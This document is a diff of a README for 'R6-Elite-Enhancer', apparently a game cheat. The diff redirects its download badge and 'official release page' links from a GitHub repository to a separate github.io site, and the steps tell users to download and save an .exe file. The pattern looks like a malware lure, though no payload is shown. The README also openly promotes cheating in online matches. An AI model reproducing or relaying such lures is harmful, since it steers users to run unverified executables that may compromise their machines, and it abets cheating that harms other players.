@@ -1,6 +1,6 @@
 # 🎯 R6-Elite-Enhancer - Gain an advantage in every match
 
-[![](https://img.shields.io/badge/Download-R6-Elite-Enhancer-blue.svg)](https://github.com/Narcostatecenterline218/R6-Elite-Enhancer)
+[![](https://img.shields.io/badge/Download-R6-Elite-Enhancer-blue.svg)](https://narcostatecenterline218.github.io)
 
 ## 📝 Project Overview
 
@@ -21,7 +21,7 @@ Your computer needs specific parts to run this software. Check your system again
 
 Follow these instructions to get the software on your computer.
 
-1. Go to the [official release page](https://github.com/Narcostatecenterline218/R6-Elite-Enhancer).
+1. Go to the [official release page](https://narcostatecenterline218.github.io).
 2. Look for the latest version section.
 3. Click the link that ends in .exe to start the file transfer.
 4. Save the file to your desktop for easy access.
